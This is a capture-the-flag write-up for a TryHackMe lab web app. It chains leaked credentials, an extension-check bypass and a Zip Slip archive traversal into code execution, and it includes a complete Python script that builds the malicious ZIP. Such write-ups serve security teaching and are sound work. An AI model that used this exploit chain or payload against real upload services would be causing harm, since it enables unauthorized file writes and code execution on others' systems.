Written By Aryan Giri


**Room:** The Hollow Shell
**Category:** Web
**Difficulty:** Medium
**Room URL:** https://tryhackme.com/room/hh-thehollowshell-ddb582ac

## Scenario

The Byte Lotus Hotel allows staff to upload "shells" — ZIP packages containing media and configuration used to customize in-room displays. The upload portal appears to validate uploaded content, but hidden functionality and unsafe archive extraction provide an opportunity to execute arbitrary code and retrieve the room flag.

---

# Enumeration

The room description points to:

```text
http://10.49.142.249
```

Initially, nothing is available on the default HTTP port, so the first step is performing a service scan.

```bash
nmap -sV -T4 10.49.142.249
```

<img width="647" height="497" alt="Screenshot 2026-08-07 114642" src="https://github.com/user-attachments/assets/22ead528-fdf7-44c9-a2b4-70f9ef34fc1c" />


The scan reveals that the web application is actually running on **port 5000**.

Visiting:

```text
http://10.49.142.249:5000
```

shows a login page.

<img width="1274" height="762" alt="Screenshot 2026-08-07 114737" src="https://github.com/user-attachments/assets/aa77f96a-70f4-417c-b14f-8bc88216f454" />


---

# Finding Credentials

Viewing the page source reveals an HTML comment accidentally containing the default staff credentials.

```html
<!--
Byte Lotus // internal display-manager portal

user: concierge
pass: StayNoticed2024!
-->
```

<img width="725" height="459" alt="Screenshot 2026-08-07 114822" src="https://github.com/user-attachments/assets/b9e70eea-8dd5-46ae-9804-c7513f995c37" />


Using those credentials grants access to the administration dashboard.

<img width="1227" height="729" alt="Screenshot 2026-08-07 114918" src="https://github.com/user-attachments/assets/06dc275e-2509-41d1-9f42-fd17bf700ed1" />

---

# Understanding the Upload Functionality

Inside the dashboard is a feature allowing users to upload ZIP files called **Shells**.

The page explains that every upload must contain a manifest file named:

```text
shell.json
```

It also mentions that uploaded packages may include optional **automation hooks** that are automatically processed by a background worker.

The interface states that only the following asset types are allowed:

```text
png
jpg
gif
svg
css
json
```

This immediately suggests inspecting how uploaded archives are validated and extracted.

---

# Observing Application Behavior

Testing the upload functionality reveals several important behaviors.

The application:

* accepts ZIP archives
* requires a `shell.json` manifest
* validates file extensions using the `assets` field inside the manifest
* extracts uploaded archives into

```text
shells/<random-id>/
```

For example:

```text
Shell 'exploit' brought ashore.
Stored at shells/804bbf170378/
```

Uploaded files become directly accessible through URLs such as:

```text
/shells/<uuid>/shell.json
```

The application also serves static content from:

```text
/static/
```

Invalid asset extensions generate messages like:

```text
Shell rejected: asset type not allowed
```

while unexpected failures return a generic Flask Internal Server Error.

One particularly interesting note is that uploaded shells may contain **automation hooks**, which are executed shortly after upload.

---

# Zip Slip

The application extracts user-controlled ZIP archives, making **Zip Slip** a potential attack vector.

Zip Slip is a directory traversal vulnerability that occurs when archive extraction trusts filenames supplied inside an archive.

Instead of extracting:

```text
image.png
```

an attacker can include entries such as:

```text
../../hooks/get_flag.py
```

If the extraction process does not sanitize paths, files are written outside the intended directory.

This can lead to:

* arbitrary file overwrite
* configuration replacement
* remote code execution
* persistence
* privilege escalation

---

# Exploit Strategy

After several attempts, the working exploit chain consists of three independent issues.

## 1. Extension Validation Bypass

The application only validates filenames listed inside:

```json
assets
```

within `shell.json`.

Using an empty array completely bypasses extension validation.

```json
{
    "name": "exploit",
    "assets": []
}
```

---

## 2. Zip Slip Arbitrary File Write

The archive contains a malicious entry:

```text
../../hooks/get_flag.py
```

During extraction:

```text
shells/<uuid>/../../hooks/get_flag.py
```

resolves to

```text
hooks/get_flag.py
```

allowing an attacker-controlled Python file to be written into the application's hooks directory.

---

## 3. Automatic Hook Execution

According to the application, uploaded shells may contain automation hooks processed by a background worker.

Once the malicious Python file is written into:

```text
hooks/
```

the worker automatically executes it.

The payload:

* searches common flag locations
* reads the flag
* writes the result into

```text
static/leaked_flag.css
```

Since the static directory is publicly accessible, the flag can be retrieved over HTTP without requiring an interactive shell.

---

# Final Exploit Script

Save the following script as:

```text
hollow_shell_exploit.py
```

```python
#!/usr/bin/env python3
"""
The Hollow Shell - Final Exploit
Made by aryan giri | giriaryan694-a11y

Bypasses extension check via empty assets array.
Drops flag retrieval payload into the automated hooks directory.
The theme worker executes the dropped script, reads the flag,
and writes it to the web-accessible static directory.
"""

import zipfile
import json

__author__ = "aryan giri | giriaryan694-a11y"

OUT = "hollow_shell_final.zip"

# 1. EMPTY assets array completely bypasses the extension filter.
manifest = {
    "name": "exploit",
    "assets": []
}

# 2. Python script executed by the theme worker.
# It searches common flag locations and writes the flag into /static/.
hook_script = """
import os
import glob

flag_content = "FLAG_NOT_FOUND_TRY_LATER"

# Common CTF flag locations
patterns = [
    "/flag*",
    "/flag.txt",
    "/app/flag*",
    "/app/flag.txt",
    "/home/*/flag*",
    "/home/*/flag.txt",
    "/home/roomservice/flag*",
    "/home/roomservice/flag.txt",
    "/root/flag*",
    "/root/flag.txt",
    "/opt/flag*"
]

for p in patterns:
    for f in glob.glob(p):
        try:
            with open(f, "r") as file:
                flag_content = file.read().strip()
                break
        except:
            pass

output = "/* FLAG: " + flag_content + " */\\n"

# Try multiple possible static paths because worker CWD may vary
paths_to_try = []

try:
    current_file = os.path.abspath(__file__)
    hooks_dir = os.path.dirname(current_file)
    app_root = os.path.dirname(hooks_dir)

    paths_to_try.append(os.path.join(app_root, "static", "leaked_flag.css"))
    paths_to_try.append(os.path.join(hooks_dir, "..", "static", "leaked_flag.css"))
except:
    pass

paths_to_try += [
    "../../static/leaked_flag.css",
    "../static/leaked_flag.css",
    "static/leaked_flag.css",
    "/app/static/leaked_flag.css",
    "/var/www/html/static/leaked_flag.css"
]

for path in paths_to_try:
    try:
        with open(path, "w") as f:
            f.write(output)
    except:
        pass
"""

with zipfile.ZipFile(OUT, "w") as zf:
    # Required manifest
    zf.writestr("shell.json", json.dumps(manifest))

    # Zip Slip payload:
    # shells/<uuid>/../../hooks/get_flag.py -> hooks/get_flag.py
    zf.writestr("../../hooks/get_flag.py", hook_script)

    # Sanity check file to prove Zip Slip worked
    zf.writestr("../../static/sanity_check.css", "/* EXTRACTION_SUCCESS */\n")

print("[+] Generated:", OUT)
print("[+] Made by aryan giri | giriaryan694-a11y")
print("[+] Upload this ZIP to the Shoreline Display portal.")
print("[+] Then check:")
print("    http://TARGET:5000/static/sanity_check.css")
print("    http://TARGET:5000/static/leaked_flag.css")
```

---

# Generate the Malicious Archive

```bash
python3 hollow_shell_exploit.py
```

The script generates:

```text
hollow_shell_final.zip
```

Verify its contents:

```bash
python3 -m zipfile -l hollow_shell_final.zip
```

Expected entries:

```text
shell.json
../../hooks/get_flag.py
../../static/sanity_check.css
```

---

# Upload the Shell

Upload the generated archive through the Shoreline Display portal.

<img width="962" height="467" alt="Screenshot 2026-08-07 134620" src="https://github.com/user-attachments/assets/9c7a035e-238f-4d85-a57c-da1ba9ebc9a6" />


After uploading, the application reports:

```text
Shell 'exploit' brought ashore.
Stored at shells/804bbf170378/
and held to the room's ear.
```

<img width="916" height="606" alt="Screenshot 2026-08-07 134636" src="https://github.com/user-attachments/assets/f2b8c430-a689-4072-8107-7f5851f52cd5" />


This confirms the archive has been extracted and processed.

---

# Verify Arbitrary File Write

Confirm that Zip Slip successfully wrote a file into the application's static directory.

```bash
curl http://TARGET:5000/static/sanity_check.css
```

Expected response:

```css
/* EXTRACTION_SUCCESS */
```

This verifies arbitrary file write.

---

# Retrieve the Flag

Wait a few seconds for the theme worker to execute the hook.

Then browse to:

```text
http://TARGET:5000/static/leaked_flag.css
```

or

```bash
curl http://TARGET:5000/static/leaked_flag.css
```

<img width="726" height="223" alt="Screenshot 2026-08-07 135056" src="https://github.com/user-attachments/assets/566858e0-3428-4e50-9afc-c06d4337cbab" />


The response contains the TryHackMe flag inside a CSS comment.

The flag has been intentionally hidden in this writeup to comply with TryHackMe's content guidelines.

---

# Attack Chain

```text
Source Code Review
        │
        ▼
Hardcoded Credentials
        │
        ▼
Authenticated Dashboard
        │
        ▼
Upload Shell ZIP
        │
        ▼
Empty assets[] bypasses extension validation
        │
        ▼
Zip Slip directory traversal
        │
        ▼
Overwrite hooks/get_flag.py
        │
        ▼
Theme Worker Executes Hook
        │
        ▼
Flag Written to /static/leaked_flag.css
        │
        ▼
Retrieve Flag via HTTP
```

## Key Takeaways

* Never rely solely on client-controlled metadata for security decisions.
* Archive extraction routines must sanitize filenames to prevent directory traversal.
* Background automation that executes uploaded content significantly increases the impact of arbitrary file write vulnerabilities.
* Information disclosure, weak validation, and unsafe extraction combined into a complete remote code execution chain.

Happy Hacking!
